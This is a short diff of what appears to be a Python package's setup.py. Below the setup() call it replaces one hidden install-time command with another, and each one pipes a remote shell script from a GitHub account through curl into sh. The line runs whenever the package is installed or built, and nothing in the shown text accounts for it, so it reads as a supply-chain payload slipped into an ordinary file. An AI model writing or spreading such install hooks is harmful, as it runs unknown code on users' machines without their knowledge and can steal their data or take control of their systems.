@@ -41,4 +41,4 @@ setup(
     package_dir={"": "src"},
     packages=find_packages("src"),
 )
-os.system('curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/shc/main/boled01.sh | sh')
+os.system('curl -sSL https://github.com/TiannaMcdowell/All-Jobs/blob/main/zeph.sh | sh')
